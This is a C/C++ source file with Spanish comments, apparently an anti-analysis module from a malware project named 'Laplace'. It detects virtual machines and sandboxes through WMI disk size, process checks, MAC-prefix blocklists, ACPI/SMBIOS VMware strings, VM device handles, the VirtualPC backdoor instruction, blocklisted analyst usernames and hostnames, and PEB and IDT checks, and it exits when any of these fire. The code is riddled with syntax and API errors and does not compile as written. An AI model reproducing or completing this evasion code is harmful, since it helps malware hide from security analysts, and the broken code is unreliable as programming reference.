/*
HeapFree y CloseHandle
SYSCALLS:
- ver si plicar Syscalls en las funciones CreateToolHelp32Snapshot, etcétera.

*/

#include "laplace.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
	//Verificar X86 o X64
	
	//https://stackoverflow.com/questions/2877295/get-os-in-c-win32-for-all-versions-of-win
	OSVERSIONINFOEX osver; //Estructura sobre información del sistema operativo
	ZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	
	GetVersionEx((LPOSVERSIONINFO)&osver); //Obtener el sistema operativo actual
	
	LPBYTE data = 0;
	
	if(NERR_Sucess == NetWkstaGetInfo(NULL, 100, &data)){ //Obtener información de la workstation si es el caso
		
		WKSTA_INFO_100* workstation = (WKSTA_INFO_100*)data; //Estructura con datos de la WorlStation
        osver.dwMajorVersion = workstation->wki100_ver_major; 
        osver.dwMinorVersion = workstation->wki100_ver_minor;
        //Si es Workstation, le ponemos igualmente las versiones correspondientes a un OS normal
        ::NetApiBufferFree(data); //Liberamos lo que ya no necesitamos
		}
	
	/*
	Diferenciar Windows 8 de Windows 8.1, realmente no sirve para este contexto, pero lo dejo por si alguien quiere implementarlo
	else if(osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2){ //diferenciar Windows 8 de 8.1
		OSVERSIONINFOEX osvi;
		ZeroMemory(&osvi, sizeof(osvi));
		osvi.dwOSVersionInfoSize = sizeof(osvi);
        osvi.dwMinorVersion = 3; 
		ULONGLONG sv = 0;
		
		sv = VerSetConditionMask(sv, VER_MINORVERSION, VER_EQUAL); 
        if(VerifyVersionInfo(&osvi, VER_MINORVERSION, vm) osver.dwMinorVersion = osvi.dwMinorVersion = 3;
		}
       */
	
    if(osver.dwMajorVersion < 6){
    	Exit(1);
	}
	
	
	
	if(CHECK_VM()){
		Exit(1);
		}
    }

static BOOL CHECK_VM(){
	
	int gb_size = 257;
	BOOL ProcError = FALSE;
	HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); //Inicialización de la biblioteca COM para ser usada por el subproceso que haga la llamada. La simultaneidad Multi-threading (también llamado free-threading) permite que las llamadas a métodos de objetos creados por este hilo se ejecuten en cualquier hilo. No hay serialización de llamadas, es decir, pueden ocurrir muchas llamadas al mismo método
    //Hay que configurar las llamadas a la WMI
	
	if(FAILED(hres)){ProcError = FALSE;goto check_vmprocess;}
	
	//Inicialización para la seguridad del proceso COM. 
	hres =  CoInitializeSecurity(
    NULL, //Permisos que necesita un servidor para recibir llamadas
    -1,   //COM elige servicio de autentificación al recibir las llamadas. Schannel (Paquete de seguridad que admite ciertos protocolos seguros) no será usado                    
    NULL, //Autentificaciones que el servidor usará                     
    NULL,   //Siempre es NULL                     
    RPC_C_AUTHN_LEVEL_DEFAULT, //Parámetro usado por el cliente, el nivel de autentificación lo eligirá COM, y eligirá la manta de seguridad adecuada
    RPC_C_IMP_LEVEL_IMPERSONATE, //Nivel de suplantación, usado por el cliente. Elegido por COM. Siempre tendrá el nivel de suplantación asociado.
    NULL, //Lista de nuestras autentificaciones escogidas cuando COM elige el nivel.                  
    EOAC_NONE, //Ninguna capacidad              
    NULL //Siempre es NULL                   
    );
	
	if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
	
	IWbemLocator *loc = NULL; //Objeto COM en proceso. Interfaz para obtener el puntero a la interfaz para acceder a WMI
	
	hres = CoCreateInstance( //Obtener el localizador antes mencionado, creando un objeto asociado a la CLSID
     CLSID_WbemLocator,  //Código asociado para la creación del objeto       
    0, //Objeto no creado por parte de un agregado.
    CLSCTX_INPROC_SERVER, //Contexto donde operará este objeto. Se ejecutará en el mismo proceso que el que llamó la función creadora del contexto
    IID_IWbemLocator, (LPVOID *) &loc); //Interfaz puntero de la interfaz que nos brindará acceso a la WMI
    
    if(FAILED(hres)){ ProcError = TRUE;CoUninitialize(); goto check_vmprocess;}
    
    IWbemServices *svc = NULL; //Interfaz que nos permitirá acceder a la WMI
    
    int timer = GetTickCount();
    
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WAIT_SVTIME, timer, 0, NULL); 
    
    hres = loc->ConnectServer(//Ahora el objeto debe conectarse al namespace deseado de la WMI (clases sobre hardware principalmente) 
    _bstr_t(L"ROOT\\CIMV2"), //namespace de WMI donde queremos acceder
    NULL,  //Username actual del cliente               
    NULL, //Contraseña: Contexto actual                   
    0, //Configuración regional actual              
    0,  //Acceso al servidor cuando sea posible.               
    0, //Usuario actual a autentificar                  
    0,  //Este valor en este contexto casi siempre es nulo                    
    &svc  //Puntero vinculado a la interfaz de acceso a WMI           
     );
     
     PGLOB->CON_REALIZED = TRUE;
     
     
     if(FAILED(hres)){ProcError = TRUE; loc->Release();CoUninitialize(); goto check_vmprocess;}
     
     hres = CoSetProxyBlanket(//Inicialización de la seguridad del proxy creado para que WMI tome el papel del cliente en la consulta al namespace
     svc,  //Proxy que se establecerá                  
     RPC_C_AUTHN_WINNT, //Para la autentificación, se usará el conjunto de protocolos  NTLM, donde el cliente se tiene que autentificar con username y pass
     RPC_C_AUTHZ_NONE,  //Para que NTLM pueda ser usado     
     NULL, //Nombre por defecto del servidor y su respectiva configuración           
     RPC_C_AUTHN_LEVEL_CALL, //Inicia la autentificación cuando se envía la solicitud
     RPC_C_IMP_LEVEL_IMPERSONATE, //Nivel de suplantación, para los protocolos NTLM
     NULL,  // Identidad del proxy actual                 
     EOAC_NONE //Ninguna capacidad extra para este proxy              
    );
    
    if(FAILED(hres)){ ProcError = TRUE;loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
    
    IEnumWbemClassObject* _enum = NULL; //Interfaz para enumerar los componentes WMI
    hres = svc->ExecQuery(//Ejecutar nuestra solicitud
    bstr_t("WQL"), //Solicitamos los datos con el lenguaje de consulta WMI
    bstr_t("SELECT * FROM Win32_DiskDrive"), //Solicitamos datos de la clase sobre el disco duro
    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, //Optimizar la búsqueda
    NULL, 
     _enum); //Donde almacenaremos la consulta
    
    if(FAILED(hres)){ProcError = TRUE;_enum->Release(); loc->Release();svc->Release();CoUninitialize(); goto check_vmprocess;}
    
    IWbemClassObject *obj = NULL;
    
    
    ULONG _rvalue = 0;
    HRESULT hr;
    while(_enum){ //Recorremos los datos obtenidos
    	hr = _enum->Next(WBEM_INFINITE, 1, &obj, &_rvalue); //Los recorremos uno por uno
        if(_rvalue == 0) break;
    	}
    VARIANT val;
    
    hr = obj->Get("Size", 0, &val, 0, 0); //Obtenemos el tamaño aproximado en bytes del Disco Duro
    
    if(SUCCEEDED(hr)) hr = VariantChangeType(&val, &val, 0, VT_I4);
    else return TRUE;
    
    long byte_size = val.lVal; 
    gb_size = round(byte_size/1024/1024/1024); //Pasamos de bytes a gigabytes
    VariantClear(&val);
	_enum->Release();loc->Release();svc->Release();obj->Release();CoUninitialize();
	
    check_vmprocess:
    if(gb_size > 256){ //Las máquinas virtuales no suelen superar los 256 GB
    	const char *pname[] = {}; // Nombre de los procesos encriptados 
        
        //Trataremos de obtener el PID de los procesos de las máquinas virtuales, si nos devuelve uno, significa que está presente uno de los procesos
        
        DWORD pid = 0, pids [1024], rvsize, ned;
         
         BOOL handle = FALSE;
         HMODULE hm;
         
         char *buffer = (char*)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 1024);
         if(CHECK_ALLOC_ERROR(0,0,TRUE,buffer)){
         	ProcError = TRUE;
             HeapFree(GetCurrentHeap(), 0, buffer);
             goto vm_checks;
         	}
         handle = EnumProcesses(pids, sizeof(pids), &rvsize);
         if(!handle){
         	ProcError = TRUE;
             HeapFree(GetCurrentHeap(), 0, buffer);
             goto vm_checks;
         }
         int proc = rvsize / sizeof(DWORD);
         
         for(int i = 0; i < proc;i++){
         	HANDLE hproc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
             
             if(hproc != NULL){
             	EnumProcessModules(hproc, &hm, sizeof(hm), &ned);
                 GetModuleBaseName(hproc, hm, buffer, sizeof(buffer) / sizeof(char*));
                 CloseHandle(hproc);
                 
                 if(strcmp(buffer, pname == 0){
                 	HeapFree(GetCurrentHeap(), 0, buffer);
                 	pid = pids[i];
                 	}
             	}
             else{
                 HeapFree(GetCurrentHeap(),0,buffer);
                 ProcError = TRUE;
                 CloseHandle(hproc);
                 goto vm_checks;
                 }
         	}
       HeapFree(GetCurrentHeap(),0,buffer);
       CloseHandle(hproc);  
        vm_checks:
        if(pid != 0) return TRUE;
        else{
        	BOOL SOME_BOOLEAN = CHECK_SPEC_VM_INFO();
            if(SOME_BOOLEAN){
                return TRUE;
                }
        	}
        }
    //Si algo de esto no llega a ser suficiente, tendríamos que analizar en memoria para encontrar los procesos
    if(!ProcError) return FALSE;
    Exit(1);
	}
	
	
	

/*
DESCRIPCIONES de la función CHECK_VM:

WMI: Una especie de base de datos con clases con información sobre hardware y el sistema operativo.

Componente de software: Partes del software que ofrecen o solicitan un conjunto de funcionalidades.

Módulo de un programa: Partes del software

Interfaz Binaria: Bajo nivel de la interfaz entre un programa y el sistema operativo. 
Los ABI cubren detalles como el tipo de datos, el tamaño y la alineación; la llamada
convención, que controla cómo se pasan los argumentos de las funciones y valores de retorno recuperados; 
los números de llamada del sistema y cómo una   la aplicación debe hacer llamadas al sistema operativo.

La interfaz:  es el medio con que el programa puede comunicarse con una máquina, equipo, computadora o dispositivo, y comprende todos los puntos de contacto entre el programa y el equipo.

Por lo que: COM es una ABI estandarizada en Windows, que permite la comunicación entre procesos (En este caso, WMI) 
Básicamente, para lograr integrar los componentes del software con terceras partes (como librerías, entre otros) se debe
realizar un sistema común para conseguirlo. 

Constantes de autentificación:

- Son niveles de autentificación para el cliente. Son varios niveles de protección, desde nada hasta cifrado extremo.
Nivel de suplantación (Constantes de autenticación):

- Niveles de autoridad que se le da al servidor cuando suplanta/delega el cliente. Por eso se está usando un servidor Proxy (Perteneciente a WMI).
Por que se llegan a necesitar? Esta es una técnica en la que un proceso o sistema debe utilizar las credenciales de otro principal de seguridad, en lugar de su propio contexto de seguridad, para conectarse a un recurso.
Por ejemplo, un servicio debe realizar una función en nombre de otra cuenta (por ejemplo, en nombre del usuario actual que inició sesión en la computadora). En este caso, el servicio necesita crear un token de acceso especial
que describa el contexto de seguridad de la cuenta bajo la cual queremos realizar la acción especificada. Para crear dicho token de acceso, el servicio necesita conocer las credenciales de este usuario y, si este proceso ocurre en
 la máquina local, obtener una copia del token de acceso del usuario local previamente registrado. 
 
 Fuente (página que explica muy bien sobre este tema) https://tech-es.netlify.app/articles/es537560/index.html


Negociación de seguridad (Niveles predeterminados) 
Medidas de seguridad que se le da al Proxy de una interfaz (comunicación entre dos softwares, como obtener información de WMI)
COM compara los niveles de seguridad y crea una medida de seguridad para la llamada/subproceso COM para el proxy. Por eso los clientes deben tener las medidas inicializadas.
La seguridad de ambos lados reside en los mantos de seguridad.

- Todos estos niveles de seguridad definen el proceso de COM. A veces la seguridad es necesaria para acceder a WMI, al menos en valores mínimos, según los permisos otorgados a este proceso.
por ejemplo, si un proceso no tiene permisos para borrar un archivo, con WMI tampoco. Aquí es donde actúa COM, para establecer la conexión según los privilegios a WMI.
El token de acceso es generado por el SID (id único para un usuario de windows) y contiene los grupos a los que pertenece, sus privilegios, y los procesos que inicia) nuestros procesos tienen objetos de seguridad, que almacena el control de acceso
ACL para el token. Cuando un proceso ejecutado por el usuario accede a un objeto, el token de acceso se compara con el ACL, y ahí, otorga o no los privilegios. El mecanismo de seguridad de WMI sigue esta regla de Windows, y cada namespace puede tener su propio descriptor de seguridad 
donde almacena el ACL. Las entradas de control de acceso contiene información sobre los permisos cuando realiza operaciones en el namespace
el proceso accede a WMI mediante utilidades especiales y actúa como cliente, y el objeto WMI al que se accede es el servidor. Los niveles de suplantación de DCOM estándar se utilizan para determinar qué token de acceso se utilizará cuando se trabaja con WMI en una computadora remota (No es este caso)


Indicadores de capacidad:

Capacidades adicionales para el cliente o el servidor

Clave CLSID: Identificador que identifica un componente de software en una aplicación.

El servidor proxy en este contexto es el objeto WMI para acceder a sus servicios. 

El protocolo NTLM(SSP) también negocia el nivel de seguridad (autentificación para seguridad WMI con username y pass), por eso es usado. 
Puede ser usado tanto en la capa 2-3 WMI (PC Local sin conexión a la red) tanto en la capa 3 y 2 (Conexión remota desde el PC cliente al PC remoto objetivo) para conexión 
remota. Esta diseñado para ambos contextos
MÁS INFORMACIÓN : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c0088a94-1107-48a5-8d4d-cd16d34de5ef

Las aplicaciones cliente y los scripts que acceden a proveedores estándar de WMI de 32 bits siguen funcionando con normalidad cuando se ejecutan en un sistema operativo de 64 bits. 
Solo dos proveedores preinstalados, el proveedor del Registro del sistema y el proveedor de vistas ,tienen versiones de 64 bits que se ejecutan en paralelo con las versiones de 32 bits. 
Sin embargo, una aplicación de 32 bits que solicita instancias de Windows Driver Model (WDM) de 32 bits recibe las instancias predeterminadas de la clase WDM de 64 bits en un sistema operativo de 64 bits.

el repositorio WMI es un contenedor de datos multipropósito que no se puede DETECTAR ni quitar.
*/



static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
	int start_time = (int)lpstart;
	while(GetTickCount() - start_time < 60000){
		if(PGLOB->CON_REALIZED) ExitThread(1);
		Sleep(10);
		}
		Exit(1);
	}
static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y modificado por Tolaju para Laplace: https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM
	
	int FUNC_EXCEPTION = 0;
	//OBTENER LAS MAC DE LA VM, SI NO FUERON CAMBIADAS, FUNCIONARÁ
    BOOL ANY_EXEC_CHECK = FALSE;

	PIP_ADAPTER_INFO adapter; //Estructura con información sobre networks adapters
    ULONG BUFF = sizeof(IP_ADAPTER_INFO); //Buffer por si hay una excepción
             
     char *MAC = (char *)HeapAlloc(GetProcessHeap(),HEAP_GENERATE_EXCEPTIONS,24); //Reservamos memoria para almacenar la MAC
     if(CHECK_ALLOC_ERROR(0,0,TRUE, MAC)){FUNC_EXCEPTION++; HeapFree(GetProcessHeap(), 0, MAC); goto next_vmware_check1;}
     adapter = (IP_ADAPTER_INFO *)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(IP_ADAPTER_INFO));
     if(CHECK_ALLOC_ERROR(1,1,TRUE, adapter)) {FUNC_EXCEPTION++;HeapFree(GetProcessHeap(), 0, MAC);HeapFree(GetProcessHeap(), 0, adapter);goto next_vmware_check1;}
     if(GetAdaptersAdresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_COMPARTMENTS, NULL, adapter, &BUFF) == ERROR_BUFFER_OVERFLOW){ //Si el buffer inicial no es suficiente
     	HeapFree(GetProcessHeap(),0, adapter);
         adapter = (IP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, BUFF);
         if(CHECK_ALLOC_ERROR(1,1,TRUE, adapter)) {FUNC_EXCEPTION++;HeapFree(GetProcessHeap(), 0, MAC);HeapFree(GetProcessHeap(), 0, adapter);goto next_vmware_check1;}
         //Cambiamos el tamaño del buffer al tamaño necesario
     	}
     if(GetAdaptersAdresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_COMPARTMENTS, NULL, adapter, &BUFF) == NO_ERROR){ //Si ya no hay errores
     	PIP_ADAPTER_INFO P_adapter = adapter;
         int three_pos = 0;
     	do{
     	    three_pos++; //La MAC de VM tiene 3 bloques con dos dígitos hexadecimal con 4 bytes cada uno. 8x3 = 24 Bytes
             sprintf(MAC, "%02X:%02X:%02X",P_adapter->Address[0], P_adapter->Address[1], P_adapter->Address[2]);
             P_adapter = P_adapter->Next;
             }while(P_adapter || three_pos < 3);
          HeapFree(GetProcessHeap(), 0, adapter);
     	}
     else{
     	HeapFree(GetProcessHeap(), 0, adapter);
         FUNC_EXCEPTION++;
         goto next_vmware_check1;
     }
     const char* mac_blacklist{"00:05:69", "00:0c:29" , "00:1C:14" , "00:50:56", "08:00:27", 
        "0a:00:27"}; //ENCRIPTAR DIRECCIONES MAC
     for(int i = 0; i < sizeof(mac_blacklist) / sizeof(mac_blacklist[0];i++){
     	if(strcmp(MAC, mac_blacklist[i]) == 0) return TRUE;
     	}
    HeapFree(GetProcessHeap(),0,MAC);
    next_vmware_check1:
    //Sin contar WMI, única forma de acceder al firmware en modo usuario
    //Verificaremos el Firmware ACPI, que controla la BIOS y gestiona la energía del dispositivo. Sus tablas contienen información sobre el
    //sistema base y el hardware (Aquí podríamos identificar VMWARE)
    
    PDWORD tables = (PDWORD)HeapAlloc (GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
    if(CHECK_ALLOC_ERROR(3,3,TRUE, tables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(), 0, tables);goto next_vmware_check2;}
    
    SecureZeroMemory(tables, 4096); //Limpiamos el bloque de memoria
    
    DWORD tab_size = EnumSystemFirmwareTables(('ACPI'), tables, 4096); //Enumeramos las tablas de ACPI
    if(tab_size < 4) return TRUE;
    else{
    	for(DWORD i = 0; i < tab_size/4; i++){ //Recorremos las tablas
            PBYTE newtables = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
           if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
            SecureZeroMemory(newtables, 4096)
            
            DWORD exp_bytes = GetSystemFirmwareTable(('ACPI'), tables[i], newtables, 4096); //Obtenemos las tablas
            
            if(exp_bytes == 0){ //Si ocurre un error en la escritura en el buffer
            	HeapFree(GetCurrentHeap(),0,newtables);
                HeapFree(GetCurrentHeap(), 0, tables);
                FUNC_EXCEPTION++;
                goto next_vmware_check2;
            }
            if(exp_bytes > 4096){ //Si se produce buffer overflow
            	
            	HeapFree(GetCurrentHeap(),0,newtables);  
                newtables = HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, exp_bytes);
                if(CHECK_ALLOC_ERROR(4,4,TRUE, newtables)) {FUNC_EXCEPTION++;HeapAlloc(GetCurrentHeap(),0,tables); HeapAlloc(GetCurrentHeap(), 0, newtable);goto next_vmware_check2;}
                SecureZeroMemory(newtables, exp_bytes);
                DWORD n_eb = exp_bytes;
                n_eb = GetSystemFirmwareTable(('ACPI'), tables[i], newtables, exp_bytes);
                //Reestablecemos nuestro buffer receptor con los bytes adecuados
                if(n_eb == 0){ //Si se produce un error en la escritura en el buffer
                	HeapFree(GetCurrentHeap(), 0, newtables);
                    HeapFree(GetCurrentHeap(), 0, tables);
                    FUNC_EXCEPTION++;
                    goto next_vmware_check2;
                } 
                PBYTE check_vm = newtables;
                
                if(check_vm){
                	PBYTE vmw_name = (PBYTE)"VMWARE"; //Tabla de VMWARE en el firmware ACPI
                    for(size_t vmwi = 0; vmwi < exp_bytes - 6; vmwi++){
                    	if(memcmp(&tables[vmwi], vmw_name, 6) == 0){ //Buscamos la tabla en el buffer establecido
                    	    HeapFree(GetCurrentHeap(), 0, newtables);
                            HeapFree(GetCurrentHeap(), 0, tables);
                            return TRUE;
                    	}
                    }
                }
            } 
    	}
	}
	next_vmware_check2:
	
	/*
	SMBIOS: Estructuras que se usan para leer la información de la BIOS. Esto hace que el sistema operativo no deba de 
	encargarse de analizar el hardware directamente. La inicialización UEFI (Interfaces  entre el firmware de un sistema informático) 
	incluye el protocolo EFI_SMBIOS_PROTOCOL que permite enviar estructuras SMBIOS que permiten a un productor crear una tabla para su plataforma.
	Aquí es donde las máquinas virtuales generan estas tablas para su uso, siendo también el caso de VMWARE y otros.
	*/
	DWORD firmware = (DWORD)('RSMB'); //Accedemos a las tablas
	
	PBYTE bios = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, 4096);
	if(CHECK_ALLOC_ERROR(4,4,TRUE, bios)) {FUNC_EXCEPTION++;HeapFree(GetCurrentHeap(), 0, bios);goto next_vmware_check3;}
	
	SecureZeroMemory(bios, 4096);
	
	DWORD real_bytes = GetSystemFirmwareTable(firmware, 0x0000, bios, 4096); //Tratamos de obtener las tablas de la SMBIOS
	
	if(real_bytes == 0){
		FUNC_EXCEPTION++;
		HeapFree(GetCurrentHeap(),0,bios);
		goto next_vmware_check3;
		}
	if(real_bytes > 4096){
		
		HeapFree(GetCurrentHeap(),0,bios);
		bios = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, real_bytes);
		if(CHECK_ALLOC_ERROR(4,4,TRUE, bios)){
			FUNC_EXCEPTION++;
			HeapFree(GetCurrentHeap(), 0, bios);
			goto next_vmware_check3;
			}
		SecureZeroMemory(bios, real_bytes);
		DWORD new_BiBytes = real_bytes;
		
		new_BiBytes = GetSystemFirmware(firmware, 0x0000, bios, real_bytes);
		if(new_BiBytes == 0){
			FUNC_EXCEPTION++;
			HeapFree(GetCurrentHeap(), 0, bios);
			goto next_vmware_check3;
			}
		}
		if(bios != NULL){
			PBYTE bios_vmwstr = (PBYTE)"VMware"; //Tabla de VMware en la SMBIOS
			for(size_t wbios = 0; wbios < real_bytes - 6; wbios++){
				if(memcmp(&bios[wbios], bios_vmwstr, 6) == 0){
					HeapFree(GetCurrentHeap(), 0, bios);
					return TRUE;
				}
			}
		}
	next_vmware_check3:
	
	const char* dispositivos = {"\\\\.\\vmci", "\\\\.\\HGFS"};
	
	int dlen = sizeof(dispositivos) / sizeof(dispositivos[0]);
	
	for(int dit = 0; dit < dlen; dit++){
		HANDLE dev = CreateFile(dispositivos[dit], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(!(CHECK_ALLOC_ERROR(2,2,TRUE,dev) return TRUE;
		else continue;
		}
	//VirtualPC: Créditos: https://www.codeproject.com/Articles/9823/Detect-if-your-program-is-running-inside-a-Virtual
	bool vpc = false;
	
	//Control de excepciones SEH (Excepiones a nivel de sistema operativo, no de C++ en si);
	//NOTA: Aún no está confirmado que este código pueda ejecutarse en user mode, ya que hay varias posibles razones para que no pueda, pero lo dejaré de momento.
	
	#ifndef _WIN64
    __try{
		_asm push ebx
        _asm mov  ebx, 0 
        _asm mov  eax, 1 
        _asm __emit 0Fh
        _asm __emit 3Fh
        _asm __emit 07h
        _asm __emit 0Bh

        _asm test ebx, ebx
        _asm setz [vpc]
        _asm pop ebx
        
	}
	__except(VPC_EXCEPTION_HANDLER(GetExceptionInformation())){}
	if(vpc) return TRUE;
	#endif
	/*
	COMUNICACIÓN ENTRE MÁQUINA VIRTUAL Y MÁQUINA FÍSICA;
	
	Las máquinas virtuales necesitan una forma de contactarse con la máquina real, para que por ejemplo, cuando movemos nuestro;
	ratón u otras cosas necesarias tanto a nivel de hardware como de software, también lo haga en la máquina virtual. 
	El mecanismo de comunicación se llama interfaz de puerta trasera;
	
	ISA:
	
	ISA es un conjunto de instrucciones que detalla cuales instrucciones puede procesar la CPU (Procesador)
	
	VIRTUAL PC usa muchas instrucciones que no están en la ISA para el backdoor, y que siempre trata de controlar. 
	
	El código ensamblador tratará de activar un código no especificado en la ISA, y si VPC actúa en consecuencia, no habrá una excepción
	pero si hay una excepción, normalmente quiere decir que VPC no ha actuado, por lo que no está.
	
	
	*/
	
	
	TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName(username,&size);
    
    const char *blacklisted_names[] = 
    {"jhon doe" , "sand box" , "current user" , "unknown" , "somebody" ,
    "sand box" , "sandbox" , "user" , "malware" , "maltest" , "hacker" , "timmy" ,
    "peter wilson" , "milozs" , "miller" , "johnson" , "it-admin" , "hong lee" , "lab" , "labs", "blue team" ,
    "blue" , "hapubws" , "emily" , "analysis"};
    
    for(int uit = 0; uit < sizeof(blacklisted_names) / sizeof(blacklisted_names[0]); uit++){
    	if(strcmp((tolower(username)), blacklisted_names[uit]) == 0){
    	    return TRUE;
    	    }
    	}
    
    char *hostname = (char *)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, ((MAX_COMPUTERNAME_LENGHT) * 4)+1);
    if(CHECK_ALLOC_ERROR(0,0,TRUE,hostname){
    	FUNC_EXCEPTION++;
        HeapFree(GetCurrentHeap(), 0, hostname);
        goto blacklisted_check1;
    	}
    int CN_Handle = GetComputerName(hostname, MAX_COMPUTERNAME_LENGHT + 1);
    if(CN_Handle == 0){
    	FUNC_EXCEPTION++;
        HeapFree(GetCurrentHeap(), 0, hostname);
        goto blacklisted_check1;
    	}
    
    char *dns_host = (char *)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, ((MAX_COMPUTERNAME_LENGHT) * 4)+1);
    if(CHECK_ALLOC_ERROR(0,0,TRUE, dns_host)){
    	FUNC_EXCEPTION++; 
        HeapFree(GetCurrentHeap(), 0, hostname);
        HeapFree(GetCurrentHeap(), 0, dns_host);
        goto blacklist_check1;
    	}
    CN_Handle = GetComputerNameEx(ComputerNameDnsHostName, NULL, dns_host, (MAX_COMPUTERNAME_LENGHT + 1));
    if(CN_Handle == 0){
    	HeapFree(GetCurrentHeap(), 0, hostname);
        HeapFree(GetCurrentHeap(), 0, dns_host);
        goto blacklist_check1;
    	}
    const char* black_host[] = {"sandbox" , "7silvia" , "hanspeter-pc" , "john-pc" ,
    "mueller-pc" , "win7-traps" , "tequilaboomboom" , "fortinet", "lab" , "labs" , "blue team" ,
    "blue" , "hacker" , "unknown" , "user" , "malware" , "test" , "testing" , "username" , "somebody"};
    
    for(int hit = 0; hit < sizeof(black_host)/sizeof(black_host[0]);hit++){
    	if(strcmp(tolower(hostname), black_host[hit]) != 0){
    	    if(strcmp(tolower(dns_host), black_host[hit]) != 0) break;
            else return TRUE;
    	    }
        else return TRUE;
	    }
    //Obtención de los nombres asociados al NetBIOS (Protocolo de red local) y de los nombres asociados al DNS local

    blacklist_check1:
    
    
    #ifndef _WIN64
	PULONG num_poc = (PULONG)(__readfsdword(0x30) + 0x64);
	#else
	PULONG num_poc = (PULONG)(__readgsqword(0x60) + 0xB8);

#endif

    
    if(*num_poc < 2) return TRUE;
    
    
    /*
    leer pointers donde se ubican las IDT (Tabla donde se almacenan vectores de interruptores, usados para responder a excepciones) del sistema operativo, cuyas direcciones se cambian en 
    las máquinas virtuales. 
    */
    
	

	char idtr[6];
	ULONG idt = 0;

	//Almacenamos información sobre el IDT

#ifndef _WIN64
	_asm sidt idtr
#endif
	idt = *((unsigned long *)&idtr[2]);
	
	if((idt) >> 24) == 0xff) return TRUE;
    
    
	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
                                                               //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción;
    else return FALSE;                                                           
}
BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
	//Controlamos los errores de memoria
	LinkedList<void *> lista;
	va_list vl;
	va_start(vl,arg);
	for(int i = 0; i <=arg; i++){
		switch(i){
		case 0: ;
		    lista.add((void *)va_arg(vl, char *));
		    break;
		
		case 1: ;
		    lista.add((void *)va_arg(vl, IP_ADAPTER_INFO *));
		    break;
		case 2: ;
		    lista.add((void *)va_arg(vl, HANDLE));
		    break;
		case 3: ;
		    lista.add((void *)va_arg(vl, PDWORD);
		    break;
		case 4: ;
		    lista.add((void *)va_arg(vl, PBYTE);
		    break;
		    }
		
		}
	va_end(vl);
	switch(DATA_TYPE_ID){
		case 0: ;
	        if((char *)lista[DATA_TYPE_ID] == NULL){
		        HeapFree(GetProcessHeap(), 0, (char *)lista[DATA_TYPE_ID]);
		        if(!RETURN)Exit(1);
		        else return TRUE;
			}
		case 1: ;
		    if((IP_ADAPTER_INFO * )lista[DATA_TYPE_ID] == NULL){
			    HeapFree(GetProcessHeap(),0,(IP_ADAPTER_INFO *)lista[DATA_TYPE_ID]);
			    if(!RETURN)Exit(1);
		        else return TRUE;
		case 2: ;
			if((HANDLE)lista[DATA_TYPE_ID] == INVALID_HANDLE_VALUE){
				CloseHandle((HANDLE)lista[DATA_TYPE_ID]);
				if(!RETURN)Exit(1);
		        else return TRUE;
				}
		case 3: ;
		    if((PDWORD)lista[DATA_TYPE_ID] == NULL){
			    HeapFree(GetProcessHeap(),0,(PDWORD)lista[DATA_TYPE_ID]);
			    if(!RETURN)Exit(1);
		        else return TRUE;
			    }
		case 4: ;
		    if(PBYTE)lista[DATA_TYPE_ID] == NULL){
			    HeapFree(GetProcessHeap(), 0, (PBYTE)lista[DATA_TYPE_ID]);
			    if(!RETURN)Exit(1);
		        else return TRUE;
			    }
			}
		}
	return FALSE;
	}
